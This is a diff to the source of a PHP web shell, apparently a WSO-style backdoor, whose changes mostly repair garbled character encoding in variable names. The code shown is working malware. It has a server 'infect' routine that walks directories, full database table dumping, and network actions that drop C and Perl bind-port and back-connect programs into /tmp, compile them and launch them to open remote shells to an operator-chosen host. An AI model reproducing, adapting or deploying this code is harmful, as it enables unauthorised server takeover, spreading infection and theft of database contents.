-<style>html{height:100%}html body{width:100%;height:100%;margin:0;font-family:Nunito, sans-serif;}.container{display:block;position:relative;width:100%;height:100%;background:linear-gradient(to bottom,#020107 0,#201b46 100%)}.container .text{color:#fff;position:absolute;top:50%;right:50%;margin:-10px -75px 0 0;font-size:20px;font-family:Nunito, sans-serif;font-weight:700}.shooting-stars{z-index:10;width:5px;height:85px;border-top-left-radius:50%;border-top-right-radius:50%;position:absolute;bottom:0;right:0;background:linear-gradient(to top,rgba(255,255,255,0),#fff);animation:animShootingStar 10s linear infinite}@keyframes animStar{from{transform:translateY(0)}to{transform:translateY(-2560px) translateX(-2560px)}}@keyframes animShootingStar{from{transform:translateY(0) translateX(0) rotate(-45deg);opacity:1;height:5px}to{transform:translateY(-2560px) translateX(-2560px) rotate(-45deg);opacity:1;height:800px}}</style>
-<footer id='det' style='position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #ff007e; border-bottom: 1px solid #ff007e'><font face='Century Gothic' color='#ff0048' size='5'><font style='font-size: 10pt' face='Century Gothic'><font face='Tahoma' color='#005aff' size='2.5'><font color='#ff007e'><b> Â©opyÂ®ight : </b></font>
-<marquee scrollamount='3' scrolldelay='60' width='80%'><b>Twepl & <a href='https://github.com/mIcHyAmRaNe'>mIcHy</a> </b></marquee>  </font></font></font></footer>");
+	die('bye!');
 }
 function actionSelfRemove() {
 	if($_POST['p1'] == 'yes')
@@ -1123,7 +1123,7 @@ function actionInfect() {
 						if($file != "." && $file != "..") {
 							if(is_dir($dir . "/" . $file)) {
 								$inner_files = ListFiles($dir . "/" . $file);
-								if(is_array($inner_files)) $files = array_merge($files, $inner_files);
+								if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
 							} else {
 								array_push($files, $dir . "/" . $file);
 							}
@@ -1142,7 +1142,7 @@ function actionInfect() {
 					}
 				}
 			}
-			echo "<font color=#a10705 size=14>$i</font>";
+			echo "<font color=red size=14>$i</font>";
 		}else{
 			echo "<form method=post><input type=submit value=Infect name=infet></form>";
 			echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
@@ -1238,7 +1238,7 @@ function actionSql() {
 		var $type;
 		var $link;
 		var $res;
-		function __construct($type)	{
+		function DbClass($type)	{
 			$this->type = $type;
 		}
 		function connect($host, $user, $pass, $dbname){
@@ -1358,27 +1358,27 @@ function actionSql() {
 					$this->query('SELECT * FROM `'.$table.'`');
                     $i = 0;
                     $head = true;
-					while($â–Ÿ = $this->fetch()) {
+					while($▟ = $this->fetch()) {
                         $sql = '';
                         if($i % 1000 == 0) {
                             $head = true;
                             $sql = ";\n\n";
                         }
 						$columns = array();
-						foreach($â–Ÿ as $k=>$v) {
+						foreach($▟ as $k=>$v) {
                             if($v === null)
-                                $â–Ÿ[$k] = "NULL";
+                                $▟[$k] = "NULL";
                             elseif(is_int($v))
-                                $â–Ÿ[$k] = $v;
+                                $▟[$k] = $v;
                             else
-                                $â–Ÿ[$k] = "'".@mysql_real_escape_string($v)."'";
+                                $▟[$k] = "'".@mysql_real_escape_string($v)."'";
 							$columns[] = "`".$k."`";
 						}
                         if($head) {
-                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $â–Ÿ).')';
+                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $▟).')';
                             $head = false;
                         } else
-                            $sql .= "\n\t,(".implode(", ", $â–Ÿ).')';
+                            $sql .= "\n\t,(".implode(", ", $▟).')';
                         if($fp) fwrite($fp, $sql); else echo($sql);
                         $i++;
 					}
@@ -1387,13 +1387,13 @@ function actionSql() {
 				break;
 				case 'pgsql':
 					$this->query('SELECT * FROM '.$table);
-					while($â–Ÿ = $this->fetch()) {
+					while($▟ = $this->fetch()) {
 						$columns = array();
-						foreach($â–Ÿ as $k=>$v) {
-							$â–Ÿ[$k] = "'".addslashes($v)."'";
+						foreach($▟ as $k=>$v) {
+							$▟[$k] = "'".addslashes($v)."'";
 							$columns[] = $k;
 						}
-                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $â–Ÿ).');'."\n";
+                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $▟).');'."\n";
                         if($fp) fwrite($fp, $sql); else echo($sql);
 					}
 				break;
@@ -1453,8 +1453,8 @@ echo ">PostgreSql</option></select></label></td>
 			}
 			$db->listDbs();
 			echo "<label><select name=sql_base><option value=''></option>";
-			while($â–Ÿ = $db->fetch()) {
-				list($key, $value) = each($â–Ÿ);
+			while($▟ = $db->fetch()) {
+				list($key, $value) = each($▟);
 				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
 			}
 			echo '</select></label>';
@@ -1493,8 +1493,8 @@ echo ">PostgreSql</option></select></label></td>
 				$db->selectdb($_POST['sql_base']);
 				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
 				$tbls_res = $db->listTables();
-				while($â–Ÿ = $db->fetch($tbls_res)) {
-					list($key, $value) = each($â–Ÿ);
+				while($▟ = $db->fetch($tbls_res)) {
+					list($key, $value) = each($▟);
                     if(!empty($_POST['sql_count']))
                         $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
 					$value = htmlspecialchars($value);
@@ -1526,19 +1526,19 @@ echo ">PostgreSql</option></select></label></td>
 						$title = false;
 						echo '<table width=100% cellspacing=1 cellpadding=2 class=main>';
 						$line = 1;
-						while($â–Ÿ = $db->fetch())	{
+						while($▟ = $db->fetch())	{
 							if(!$title)	{
 								echo '<tr>';
-								foreach($â–Ÿ as $key => $value)
+								foreach($▟ as $key => $value)
 									echo '<th>'.$key.'</th>';
-								reset($â–Ÿ);
+								reset($▟);
 								$title=true;
 								echo '</tr><tr>';
 								$line = 2;
 							}
 							echo '<tr class="l'.$line.'">';
 							$line = $line==1?2:1;
-							foreach($â–Ÿ as $key => $value) {
+							foreach($▟ as $key => $value) {
 								if($value == null)
 									echo '<td><i>null</i></td>';
 								else
@@ -1598,35 +1598,35 @@ function actionNetwork() {
 		}
 		if($_POST['p1'] == 'bpc') {
 			cf("/tmp/bp.c",$bind_port_c);
-			$â–– = ex("gcc -o /tmp/bp /tmp/bp.c");
+			$▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
 			@unlink("/tmp/bp.c");
-			$â–– .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
-			echo "<pre class=ml1>$â––".ex("ps aux | grep bp")."</pre>";
+			$▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>";
 		}
 		if($_POST['p1'] == 'bpp') {
 			cf("/tmp/bp.pl",$bind_port_p);
-			$â–– = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
-			echo "<pre class=ml1>$â––".ex("ps aux | grep bp.pl")."</pre>";
+			$▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>";
 		}
 		if($_POST['p1'] == 'bcc') {
 			cf("/tmp/bc.c",$back_connect_c);
-			$â–– = ex("gcc -o /tmp/bc /tmp/bc.c");
+			$▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
 			@unlink("/tmp/bc.c");
-			$â–– .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
-			echo "<pre class=ml1>$â––".ex("ps aux | grep bc")."</pre>";
+			$▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>";
 		}
 		if($_POST['p1'] == 'bcp') {
 			cf("/tmp/bc.pl",$back_connect_p);
-			$â–– = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
-			echo "<pre class=ml1>$â––".ex("ps aux | grep bc.pl")."</pre>";
+			$▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>";
 		}
 	}
 	echo '</div>';
 	hardFooter();
 }
 if( empty($_POST['a']) )
-	if(isset($â–š) && function_exists('action' . $â–š))
-		$_POST['a'] = $â–š;
+	if(isset($▚) && function_exists('action' . $▚))
+		$_POST['a'] = $▚;
 	else
 		$_POST['a'] = 'FilesMan';
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
